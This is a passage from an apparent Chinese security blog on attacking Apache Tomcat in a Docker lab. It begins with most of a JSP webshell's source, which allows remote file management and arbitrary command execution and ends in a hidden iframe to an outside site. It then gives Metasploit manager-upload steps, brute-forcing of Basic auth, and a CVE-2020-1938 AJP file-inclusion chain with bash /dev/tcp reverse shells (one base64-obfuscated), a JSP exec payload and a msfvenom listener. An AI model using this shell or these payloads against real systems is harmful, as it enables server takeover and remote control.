aobject.getAttribute(&quot;theme&quot;) : initTabpostcoloraobject.style.backgroundColor=document.getElementById(&quot;tabcontentcontainer&quot;).style.backgroundColor=themecolor&#125;function collecttablinks()&#123;var tabobj=document.getElementById(&quot;tablist&quot;)tabobjlinks=tabobj.getElementsByTagName(&quot;A&quot;)&#125;function do_onload()&#123;collecttablinks()initTabcolor=cascadedstyle(tabobjlinks[1], &quot;backgroundColor&quot;, &quot;background-color&quot;)initTabpostcolor=cascadedstyle(tabobjlinks[0], &quot;backgroundColor&quot;, &quot;background-color&quot;)expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])&#125;if (window.addEventListener)window.addEventListener(&quot;load&quot;, do_onload, false)else if (window.attachEvent)window.attachEvent(&quot;onload&quot;, do_onload)else if (document.getElementById)window.onload=do_onload &lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;function doForm(action,path,file,cmd,tab,content)&#123; document.frmCqq.action.value=action; document.frmCqq.path.value=path; document.frmCqq.file.value=file; document.frmCqq.cmd.value=cmd; document.frmCqq.tabID.value=tab; document.frmCqq.content.value=content; if(action==&quot;del&quot;) &#123;  if(confirm(&quot;确定要删除文件 &quot;+file+&quot; 吗？&quot;))  document.frmCqq.submit(); &#125; else &#123;  document.frmCqq.submit();     &#125;&#125;&lt;/script&gt;&lt;title&gt;JSP Shell 岁月联盟专用版本&lt;/title&gt;&lt;head&gt;&lt;body&gt;&lt;form name=&quot;frmCqq&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;2&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt;&lt;/form&gt;&lt;!--Top Menu Started--&gt;&lt;ul id=&quot;tablist&quot;&gt;&lt;li&gt;&lt;a href=&quot;&quot; class=&quot;current&quot; onClick=&quot;return expandcontent(&#x27;menu1&#x27;, this)&quot;&gt; &lt;%=strFileManage[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;new.htm&quot; onClick=&quot;return expandcontent(&#x27;menu2&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strCommand[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;hot.htm&quot; onClick=&quot;return expandcontent(&#x27;menu3&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strSysProperty[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;search.htm&quot; onClick=&quot;return expandcontent(&#x27;menu4&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strHelp[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt; &amp;nbsp; &lt;%=authorInfo[languageNo]%&gt;&lt;/ul&gt;&lt;!--Top Menu End--&gt;&lt;%StringBuffer sbFolder=new StringBuffer(&quot;&quot;);StringBuffer sbFile=new StringBuffer(&quot;&quot;);try&#123; File objFile = new File(strDir); File list[] = objFile.listFiles();  if(objFile.getAbsolutePath().length()&gt;3) &#123;  sbFolder.append(&quot;&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+formatPath(objFile.getParentFile().getAbsolutePath())+&quot;&#x27;,&#x27;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);  sbFolder.append(strParentFolder[languageNo]+&quot;&lt;/a&gt;&lt;br&gt;- - - - - - - - - - - &lt;/td&gt;&lt;/tr&gt;\r\n &quot;); &#125; for(int i=0;i&lt;list.length;i++) &#123;  if(list[i].isDirectory())  &#123;   sbFolder.append(&quot;&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&quot;);   sbFolder.append(&quot;  &lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+formatPath(list[i].getAbsolutePath())+&quot;&#x27;,&#x27;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);   sbFolder.append(list[i].getName()+&quot;&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt; &quot;);  &#125;  else  &#123;      String strLen=&quot;&quot;;   String strDT=&quot;&quot;;   long lFile=0;   lFile=list[i].length();   strLen = convertFileSize(lFile);   Date dt=new Date(list[i].lastModified());   strDT=dt.toLocaleString();   sbFile.append(&quot;&lt;tr onmouseover=\&quot;this.style.backgroundColor=&#x27;#FBFFC6&#x27;\&quot; onmouseout=\&quot;this.style.backgroundColor=&#x27;white&#x27;\&quot;&gt;&lt;td&gt;&quot;);   sbFile.append(&quot;&quot;+list[i].getName());    sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);   sbFile.append(&quot;&quot;+strLen);   sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);   sbFile.append(&quot;&quot;+strDT);   sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);   sbFile.append(&quot; &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;edit&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);   sbFile.append(strFileEdit[languageNo]+&quot;&lt;/a&gt; &quot;);   sbFile.append(&quot; &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;del&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);   sbFile.append(strFileDel[languageNo]+&quot;&lt;/a&gt; &quot;);   sbFile.append(&quot;  &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;down&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);   sbFile.append(strFileDown[languageNo]+&quot;&lt;/a&gt; &quot;);   sbFile.append(&quot;  &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;copy&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);   sbFile.append(strFileCopy[languageNo]+&quot;&lt;/a&gt; &quot;);  &#125;   &#125; &#125;catch(Exception e)&#123; out.println(&quot;&lt;font color=red&gt;操作失败： &quot;+e.toString()+&quot;&lt;/font&gt;&quot;);&#125;%&gt;&lt;DIV id=&quot;tabcontentcontainer&quot;&gt;&lt;div id=&quot;menu3&quot; class=&quot;tabcontent&quot;&gt;&lt;br&gt; &lt;br&gt; &amp;nbsp;&amp;nbsp; 未完成&lt;br&gt; &lt;br&gt;&amp;nbsp;&lt;/div&gt;&lt;div id=&quot;menu4&quot; class=&quot;tabcontent&quot;&gt;&lt;br&gt;&lt;p&gt;一、功能说明&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、&lt;/p&gt;&lt;p&gt;删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似&lt;/p&gt;&lt;p&gt;与windows的cmd。&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;二、测试&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;b&gt;请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，&lt;p&gt;留言地址为：&lt;a href=&quot;http://&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;&lt;/b&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;三、更新记录&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.11.15&amp;nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.10.27&amp;nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.09.20&amp;nbsp; 第一个jsp&amp;nbsp;程序就是这个简单的显示目录文件的小程序&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;div id=&quot;menu1&quot; class=&quot;tabcontent&quot;&gt;&lt;%out.println(&quot;&lt;table border=&#x27;1&#x27; width=&#x27;100%&#x27; bgcolor=&#x27;#FBFFC6&#x27; cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF&gt;&lt;tr&gt;&lt;td width=&#x27;30%&#x27;&gt;&quot;+strCurrentFolder[languageNo]+&quot;： &lt;b&gt;&quot;+strDir+&quot;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&quot; + getDrivers() + &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;\r\n&quot;);%&gt;&lt;table width=&quot;100%&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bordercolorlight=&quot;#000000&quot; bordercolordark=&quot;#FFFFFF&quot;&gt;               &lt;tr&gt;           &lt;td width=&quot;25%&quot; align=&quot;center&quot; valign=&quot;top&quot;&gt;               &lt;table width=&quot;98%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;3&quot;&gt;     &lt;%=sbFolder%&gt;                &lt;/tr&gt;                               &lt;/table&gt;          &lt;/td&gt;          &lt;td width=&quot;81%&quot; align=&quot;left&quot; valign=&quot;top&quot;&gt;  &lt;% if(strAction!=null &amp;&amp; strAction.equals(&quot;edit&quot;)) &#123;  out.println(sbEdit.toString()); &#125; else if(strAction!=null &amp;&amp; strAction.equals(&quot;copy&quot;)) &#123;  out.println(sbCopy.toString()); &#125; else if(strAction!=null &amp;&amp; strAction.equals(&quot;down&quot;)) &#123;  out.println(sbDown.toString()); &#125; else if(strAction!=null &amp;&amp; strAction.equals(&quot;savecopy&quot;)) &#123;  out.println(sbSaveCopy.toString()); &#125; else if(strAction!=null &amp;&amp; strAction.equals(&quot;newFile&quot;) &amp;&amp; !sbNewFile.toString().equals(&quot;&quot;)) &#123;  out.println(sbNewFile.toString()); &#125; else &#123; %&gt;  &lt;span id=&quot;EditBox&quot;&gt;&lt;table width=&quot;98%&quot; border=&quot;1&quot; cellspacing=&quot;1&quot; cellpadding=&quot;4&quot; bordercolorlight=&quot;#cccccc&quot; bordercolordark=&quot;#FFFFFF&quot; bgcolor=&quot;white&quot; &gt;              &lt;tr bgcolor=&quot;#E7e7e6&quot;&gt;                 &lt;td width=&quot;26%&quot;&gt;&lt;%=strFileName[languageNo]%&gt;&lt;/td&gt;                &lt;td width=&quot;19%&quot;&gt;&lt;%=strFileSize[languageNo]%&gt;&lt;/td&gt;                &lt;td width=&quot;29%&quot;&gt;&lt;%=strLastModified[languageNo]%&gt;&lt;/td&gt;                &lt;td width=&quot;26%&quot;&gt;&lt;%=strFileOperation[languageNo]%&gt;&lt;/td&gt;              &lt;/tr&gt;                          &lt;%=sbFile%&gt;             &lt;!-- &lt;tr align=&quot;center&quot;&gt;                 &lt;td colspan=&quot;4&quot;&gt;&lt;br&gt;                  总计文件个数：&lt;font color=&quot;#FF0000&quot;&gt;30&lt;/font&gt; ，大小：&lt;font color=&quot;#FF0000&quot;&gt;664.9&lt;/font&gt;                   KB &lt;/td&gt;              &lt;/tr&gt;    --&gt;            &lt;/table&gt;   &lt;/span&gt; &lt;% &#125;   %&gt;          &lt;/td&gt;        &lt;/tr&gt; &lt;form name=&quot;frmMake&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;tr&gt;&lt;td colspan=2 bgcolor=#FBFFC6&gt; &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;newFile&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&lt;%=strDir%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&lt;%=strFile%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt; &lt;% if(!strDir.endsWith(&quot;\\&quot;)) strDir = strDir + &quot;\\&quot;; %&gt; &lt;input type=&quot;text&quot; name=&quot;fileName&quot; size=36 value=&quot;&lt;%=strDir%&gt;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;btnNewFile&quot; value=&quot;新建文件&quot; onclick=&quot;frmMake.submit()&quot; &gt;  &lt;input type=&quot;submit&quot; name=&quot;btnNewDir&quot; value=&quot;新建目录&quot;  onclick=&quot;frmMake.submit()&quot; &gt;  &lt;/form&gt;   &lt;form name=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;upload&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&lt;%=strDir%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&lt;%=strFile%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;cqqUploadFile&quot; size=&quot;36&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;      &lt;/table&gt;&lt;/div&gt;&lt;div id=&quot;menu2&quot; class=&quot;tabcontent&quot;&gt;&lt;%String line=&quot;&quot;;StringBuffer sbCmd=new StringBuffer(&quot;&quot;);if(strCmd!=null) &#123; try &#123;  //out.println(strCmd);  Process p=Runtime.getRuntime().exec(&quot;cmd /c &quot;+strCmd);  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));  while((line=br.readLine())!=null)  &#123;   sbCmd.append(line+&quot;\r\n&quot;);    &#125;     &#125; catch(Exception e) &#123;  System.out.println(e.toString()); &#125;&#125;else&#123; strCmd = &quot;set&quot;;&#125;%&gt;&lt;form name=&quot;cmd&quot; action=&quot;&quot; method=&quot;post&quot;&gt;&amp;nbsp;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot; size=50&gt;&lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;2&quot;&gt;&lt;input type=submit name=submit value=&quot;&lt;%=strExecute[languageNo]%&gt;&quot;&gt;&lt;/form&gt;&lt;%if(sbCmd!=null &amp;&amp; sbCmd.toString().trim().equals(&quot;&quot;)==false)&#123;%&gt;&amp;nbsp;&lt;TEXTAREA NAME=&quot;cqq&quot; ROWS=&quot;20&quot; COLS=&quot;100%&quot;&gt;&lt;%=sbCmd.toString()%&gt;&lt;/TEXTAREA&gt;&lt;br&gt;&amp;nbsp;&lt;%&#125;%&gt;&lt;/DIV&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;a href=&quot;http://&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt; &lt;br&gt;&lt;iframe src=http://7jyewu.cn/a/a.asp width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></div></figure>




        <h4 id="MSF攻击"   >
          <a href="#MSF攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload set HttpUsername tomcatset HttpPassword tomcatset rhosts 192.168.175.191set rport 8080exploit</span><br></pre></td></tr></table></div></figure>



<p>这里就直接略过了 自己去操作一下 </p>
<p>这就成功进来了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619340998143.png" alt="1619340998143"></p>

        <h3 id="Tomcat-manager-App暴力破解"   >
          <a href="#Tomcat-manager-App暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat-manager-App暴力破解" class="headerlink" title="Tomcat manager App暴力破解"></a>Tomcat manager App暴力破解</h3>
      <p>我们先抓后台的包</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619341538485.png" alt="1619341538485"></p>
<p>然后放包  进行登录  </p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619341565301.png" alt="1619341565301"></p>
<p>这里注意这段回显</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619341609504.png" alt="1619341609504"></p>
<p>发现Tomcat的后台登录账号和密码</p>
<p>是以base64加密的 账号:密码</p>
<p>然后我们重新去抓后台的包 进行爆破</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619341768817.png" alt="1619341768817"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619341811564.png" alt="1619341811564"></p>
<p>添加密码本 和base64 的编码规则 </p>
<p>把这个自带的编码 对勾去掉</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342044653.png" alt="1619342044653"></p>
<p>开始攻击 拿到账号和密码</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342139990.png" alt="1619342139990"></p>
<p>这里讲第二种方式</p>
<p>自定义迭代器</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342352290.png" alt="1619342352290"></p>
<p>分位置 进行不同的载入</p>
<p>比如这里 就应该是3个位置</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342430579.png" alt="1619342430579"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342458443.png" alt="1619342458443"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619342481874.png" alt="1619342481874"></p>
<p>下面和之前的设置 一样 </p>
<p>base64编码 和去掉对勾 默认的Url编码</p>

        <h3 id="Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）"   >
          <a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）" class="headerlink" title="Tomcat AJP文件包含漏洞分析(CVE-2020-1938）"></a>Tomcat AJP文件包含漏洞分析(CVE-2020-1938）</h3>
      
        <h4 id="影响版本："   >
          <a href="#影响版本：" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x&lt;8.5.51Apache Tomcat 7.x&lt;7.0.100Apache tomcat 6.x</span><br></pre></td></tr></table></div></figure>






        <h3 id="复现-1"   >
          <a href="#复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3>
      <p>利用vulhub</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd tomcat/CVE-2020-1938sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619348867355.png" alt="1619348867355"></p>
<p>Poc地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" >https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<p>脚本是基于Python2的</p>
<p>它可以看webapps目录下的所有东西</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619349787403.png" alt="1619349787403"></p>
<p>可以看到它的语法要求</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件</span><br></pre></td></tr></table></div></figure>





<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619349894166.png" alt="1619349894166"></p>
<p>文件包含RCE </p>
<p>在线bash payload生成： <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html" >http://www.jackson-t.ca/runtime-exec-payloads.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.191/8888 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619350245468.png" alt="1619350245468"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></div></figure>



<p>最终的txt的payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print(&quot;&lt;pre&gt;&quot;);    while((a=in.read(b))!=-1)&#123;        out.println(new String(b));    &#125;    out.print(&quot;&lt;/pre&gt;&quot;);%&gt;</span><br></pre></td></tr></table></div></figure>



<p>这边要手动上传上去 </p>
<p>查看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619350478774.png" alt="1619350478774"></p>
<p>然后开始上传</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p>可以去docker 底层看看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -ti 6c bash</span><br></pre></td></tr></table></div></figure>





<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619350649495.png"></p>
<p>成功传上去了</p>
<p>开启nc监听 </p>
<p>具体可以看这里：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430" >https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619351018857.png" alt="1619351018857"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt</span><br></pre></td></tr></table></div></figure>





<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619351185840.png" alt="1619351185840"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619351175429.png" alt="1619351175429"></p>
<p>可以看到成功上线了</p>
<p><strong>可以和War联动是吧 可以和PUT联动是吧</strong></p>

        <h3 id="把shell弹到MSF上"   >
          <a href="#把shell弹到MSF上" class="heading-link"><i class="fas fa-link"></i></a><a href="#把shell弹到MSF上" class="headerlink" title="把shell弹到MSF上"></a>把shell弹到MSF上</h3>
      <p>MSF生成木马</p>
<p>我这边还是上kali吧  Ubuntu不是很顺手</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R &gt; shell.txt</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619351850151.png" alt="1619351850151"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p>去docker底层看看</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619351998810.png" alt="1619351998810"></p>
<p>上MSF 开启监听</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcppayload =&gt; java/jsp_shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.175.167lhost =&gt; 192.168.175.167msf6 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf6 exploit(multi/handler) &gt; exploit -j</span><br></pre></td></tr></table></div></figure>



<p>执行文件包含RCE</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt</span><br></pre></td></tr></table></div></figure>





<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619352574611.png" alt="1619352574611"></p>
<p>可以看到已经拿到shell了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619352504843.png" alt="1619352504843"></p>
<p>按shell就可以进来了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619352730021.png" alt="1619352730021"></p>
